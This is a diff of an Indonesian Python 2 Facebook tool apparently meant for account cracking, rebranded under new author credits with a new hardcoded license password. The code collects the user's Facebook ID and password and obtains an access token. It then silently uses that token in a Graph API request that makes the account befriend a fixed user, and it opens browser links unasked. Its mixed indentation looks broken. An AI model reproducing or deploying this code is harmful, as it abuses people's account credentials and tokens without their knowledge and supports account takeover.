@@ -46,19 +46,19 @@ def jalan(z):
 		
 		
 logo = """  
-\033[32;1m….._\____________________,,__
-\033[32;1m…./ `–│││││││││———————-_]
-\033[32;1m…/_==o ____________________DO°R*
-\033[32;1m…..),—.(_(__) /
-\033[32;1m….// (\) ),——
-\033[32;1m…//___//
-\033[32;1m../`—-’ / …
-\033[32;1m./____ / …\033[1;96m{√}NAWAN•BARUS{√}
-\033[0;1m╔═══════════════════════════════════════════╗
-\033[0;1m║\033[33;1m{√}\033[34;1mAuthor \033[1;91m: \033[0;1mN A W A N \033[1;93m                   
-\033[0;1m║\033[33;1m{√}\033[34;1mYouTube \033[1;91m: \033[0;1mnawan barus \033[1;93m                  
-\033[0;1m║\033[33;1m{√}\033[34;1mWhatsApp \033[1;91m: \033[0;1mBELUM ADA WA \033[1;93m       
-\033[0;1m╚═══════════════════════════════════════════╝
+\033[32m….._\____________________,,__
+\033[32m…./ `–│││││││││  \033[0;1mMejuah-Juah -->
+\033[32m…/_==o ______________\033[0;1mBinjai City -->
+\033[32m…..),—.(_(__) /
+\033[32m….// (\) ),——
+\033[32m…//___//
+\033[32m../`—-’ / …
+\033[32m./____ / … 
+\033[32m╔═════════════════=========
+\033[33m{*}\033[0;1mAuthor kalak karo
+\033[33m{*}\033[0;1mDecompile bye jepri barus
+\033[33m{✓}\033[0;1mYoutube Bang Jep
+\033[32m╚═════════════════========="""""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -74,7 +74,7 @@ oks = []
 id = []
 
 def siapa():
-	os.system('clear')
+        os.system('clear')
 	nama = raw_input("\033[1;97mSiapa nama Anda ? \033[1;91m: \033[1;92m")
 	if nama =="":
 		print"\033[1;96m[!] \033[1;91mIsi yang benar"
@@ -86,10 +86,10 @@ def siapa():
 		time.sleep(1)
 		loginSC()
 		
-                
+		
 def loginSC():
 	os.system('clear')
-	print 42*"\033[1;96m="
+        print 42*"\033[1;96m="
 	print"\033[1;93mLogin Lisensi Scriptnya dulu Bestku \033[33;1m{√}"
         print"\033[1;93mJika tidak tau Lisensi nya Download Dulu \033[33;1m{√}"
         print"\033[1;93mSilahkan download Lisensinya di website \033[33;1m{√}"
@@ -100,18 +100,17 @@ def loginSC():
         print"\033[1;93mJanggan lupa SUBSCRIBE YouTube Admin Terimakasih \033[33;1m{√}"
         print 42*"\033[1;96m="
 	os.system('xdg-open https://tatawirdat.blogspot.com')
-        username = raw_input("\033[1;96m[*] \033[1;97mID \033[1;91m: \033[1;92m")
+        username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
-	if username =="anak" and password =="binjai":
+	if username =="SEMOGA" and password =="BERHASIL":
 		print"\033[1;96m[✓] \033[1;92mLogin success"
 		time.sleep(1)
-		loginSC()
+		login()
 	else:
 		print"\033[1;96m[!] \033[1;91mSalah!!"
 		os.system('xdg-open https://tatawirdat.blogspot.com')
                 time.sleep(1)
                 LoginSC()
-
 def login():
 	os.system('clear')
 	try:
@@ -120,13 +119,15 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		print 42*"\033[0;1m-"
-		print('\033[34;1mSilahkan Daftar fb baru dari google chrome' )
-		print('\033[34;1mAgar tidak terkena chekpoint saat login' )
-		print 42*"\033[0;1m-"
-		print('\033[1;96m[✓] \x1b[33;1mLOGIN AKUN FACEBOOK KAMU \x1b[1;96m[ ! ]' )
-		id = raw_input('\033[32m[+] \x1b[33;1mID/Email \x1b[33;1m: \x1b[0;1m')
-		pwd = raw_input('\033[32m[+] \x1b[33;1mPassword \x1b[33;1m: \x1b[0;1m')
+                print 42*"\033[1;96m~"
+                print"\033[33;1mSilahkan Daftar Akun FB di Google Chrome"
+                print"\033[33;1mAgar Tidak Terkena Check Point Saat Login"
+                print 42*"\033[1;96m~"
+                print"\033[33;1m                                         "
+		print 42*"\033[1;96m="
+		print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[☆]' )
+		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
+		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -155,15 +156,14 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/channel/UCwdOY4YQZW5ejDEpo1SolHQ')
+				os.system('xdg-open https://www.youtube.com/channel/UCP0-8OzsHywqN461bVFjUbQ')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
-			os.system('xdg-open https://www.youtube.com/channel/UCwdOY4YQZW5ejDEpo1SolHQ')
-			os.system('rm -rf login.txt')
+			os.system('xdg-open https://www.youtube.com/channel/UCP0-8OzsHywqN461bVFjUbQ')
 			time.sleep(1)
 			keluar()
 		else:
@@ -396,4 +396,4 @@ def pilih_super():
        
 		
 if __name__ == '__main__':
-	siapa()
+	login()
